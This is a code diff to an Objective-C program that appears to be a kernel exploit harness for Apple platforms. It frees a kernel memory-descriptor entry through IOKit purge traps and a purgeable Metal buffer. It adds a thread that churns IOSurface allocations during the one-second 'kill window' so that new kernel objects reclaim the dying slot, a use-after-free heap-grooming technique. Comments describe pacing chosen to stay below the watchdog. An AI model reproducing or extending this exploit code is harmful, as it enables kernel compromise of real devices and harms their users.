@@ -16,6 +16,9 @@
 #import <fcntl.h>
 #import <mach/mach.h>
 #import <setjmp.h>
+#import <dlfcn.h>
+#import <pthread.h>
+#import <pthread/qos.h>
 #import <signal.h>
 #import <stdarg.h>
 #import <string.h>
@@ -62,6 +65,33 @@ static void p065_sigabort(int sig, siginfo_t *info, void *vctx) {
 }
 
 @interface P065AssertSwallow : NSAssertionHandler @end
+static volatile int g_p065SurfGo = 0;
+typedef IOSurfaceRef (*p065_surfcreate_t)(CFDictionaryRef);
+static void *p065_surf_churn(void *arg) {
+    (void)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_UTILITY, 0);
+    p065_surfcreate_t pCr = (p065_surfcreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    if (!pCr) return NULL;
+    int32_t w = 64, h = 64, bpe = 4;
+    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+    CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+    const void *ck[3] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"), CFSTR("IOSurfaceBytesPerElement") };
+    const void *cv[3] = { nw, nh, nb };
+    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, ck, cv, 3,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFRelease(nw); CFRelease(nh); CFRelease(nb);
+    while (g_p065SurfGo) {
+        for (int i = 0; i < 8 && g_p065SurfGo; i++) {
+            IOSurfaceRef s = pCr(props);
+            if (s) CFRelease(s);
+        }
+        usleep(25000);
+    }
+    if (props) CFRelease(props);
+    return NULL;
+}
+
 @implementation P065AssertSwallow
 - (void)handleFailureInMethod:(SEL)s object:(id)o file:(NSString *)f
                    lineNumber:(NSInteger)l description:(NSString *)d, ... {
@@ -300,12 +330,22 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
         NSUInteger mtlE = (NSUInteger)[legit setPurgeableState:MTLPurgeableStateEmpty];
         p065_log(@"[v4b] MTL setPurgeableState(Empty) -> %lu", (unsigned long)mtlE);
         legit = nil;          /* last client ref — entry dies if nothing pinned it */
+        /* 2026-11-19: IOSurface churn during the 1s kill window — the p159
+           family's kernel objects compete for the dying MD slot. UTILITY QoS
+           + 25ms pacing = no watchdog class. */
+        g_p065SurfGo = 1;
+        pthread_t thP065 = 0;
+        if (pthread_create(&thP065, NULL, p065_surf_churn, NULL) == 0)
+            p065_log(@"[churn] IOSurface churn live during the kill window");
+        else { g_p065SurfGo = 0; thP065 = 0; }
         kern_return_t krCheck = 0;
         for (int k = 0; k < 5; k++) {
             usleep(200000);
             krCheck = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
             if (krCheck == 0xe00002c2) break;   /* really dead — ladder ends */
         }
+        g_p065SurfGo = 0;
+        if (thP065) pthread_join(thP065, NULL);
         g_seedTex = nil;
         g_seedBuf = nil;
         p065_log(@"[v4b] post-kill (1s re-probe ladder) purge(dead id) kr=0x%x — 2c2 = entry really died", (unsigned)krCheck);
